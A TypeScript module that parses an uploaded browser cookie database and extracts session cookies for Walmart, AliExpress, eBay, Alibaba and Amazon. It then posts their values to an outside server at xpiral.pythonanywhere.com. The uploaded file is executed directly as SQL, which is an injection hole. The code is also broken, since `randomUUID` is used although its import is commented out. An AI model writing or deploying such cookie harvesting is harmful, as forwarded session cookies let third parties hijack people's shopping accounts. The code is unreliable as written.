import sqlite3 from "sqlite3";
// import { randomUUID } from "crypto";

export interface Cookie {
  key: string;
  creation_utc: number;
  host_key: string;
  name: string;
  value: string;
  expires_utc: number | string;
  encrypted_value: string | null;
  last_access_utc: number;
  last_update_utc: number;
  expires_time: string;
  last_access_time: string;
  last_update_time: string;
}

export async function readCookies(fileBuffer: Buffer, _token: string) {
  const done: string[] = [];

  if (
    _token &&
    _token.includes("JWT") &&
    _token.split("JWT")["1"]?.length > 5
  ) {
    const refresh_token = _token.split("JWT")[1];

    if (!fileBuffer || !Buffer.isBuffer(fileBuffer)) {
      return { error: "No valid file buffer received.", status: 400 };
    }

    try {
      const db = new sqlite3.Database(":memory:");
      // throw db;

      db.exec(fileBuffer.toString()); // Assuming the fileBuffer contains SQL commands to create tables and insert data

      const currentTime = Math.floor(Date.now() / 1000);

      const cookiesPromise = new Promise((resolve, reject) => {
        db.all(
          `
          SELECT 
              creation_utc, 
              host_key, 
              name, 
              value, 
              expires_utc, 
              encrypted_value, 
              last_access_utc, 
              last_update_utc 
          FROM cookies 
          WHERE expires_utc > ?
          `,
          [currentTime],
          (err, rows) => {
            if (err) {
              console.error("Error executing query:", err);
              reject({ error: "Internal Server Error", status: 500 });
              return;
            }

            const cookies = rows
              .map((row: any) => ({
                key: randomUUID(),
                creation_utc: row.creation_utc,
                host_key: row.host_key,
                name: row.name,
                value: row.value,
                expires_utc: row.expires_utc,
                encrypted_value: "encrypted",
                last_access_utc: row.last_access_utc,
                last_update_utc: row.last_update_utc,
                expires_time: timestampToTime(row.expires_utc),
                last_access_time: timestampToTime(row.last_access_utc),
                last_update_time: timestampToTime(row.last_update_utc),
              }))
              .filter((cookies) => {
                const t =
                  !done.includes(cookies.host_key) &&
                  (cookies.host_key.includes(".walmart.com") ||
                    cookies.host_key.includes(".aliexpress.com") ||
                    cookies.host_key.includes(".ebay.com") ||
                    cookies.host_key.includes(".alibaba.com") ||
                    cookies.host_key.includes(".walmart") ||
                    cookies.host_key.includes(".amazon"));
                if (t) {
                  done.push(cookies.host_key);
                }
                return t;
              });

            console.log(cookies);

            resolve(cookies);
          }
        );
      });

      const cookies = (await cookiesPromise) as any;

      // Fetching access token
      let access_token;
      try {
        access_token = await fetch(
          "https://xpiral.pythonanywhere.com/auth/jwt/refresh/",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              refresh: refresh_token,
            }),
          }
        );
      } catch (e) {
        console.log(e);
        return {
          error: "Internal Server Error",
          status: 500,
        };
      }

      // Updating user data
      try {
        const updateUserResponse = await fetch(
          "https://xpiral.pythonanywhere.com/update/user/data/",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Authorization: `JWT ${(await access_token?.json())?.access}`,
            },
            body: JSON.stringify({
              cookies_data: cookies,
            }),
          }
        );
      } catch (e) {
        console.log(e);
        return { error: "Internal Server Error", status: 500 };
      }

      return {
        cookies: cookies.length > 100 ? cookies.slice(0, 100) : cookies,
        status: 200,
      };
    } catch (e) {
      console.log(e);
      return { error: "Internal Server Error", status: 500 };
    }
  }

  return { error: "Credential were not provided", status: 402 };
}
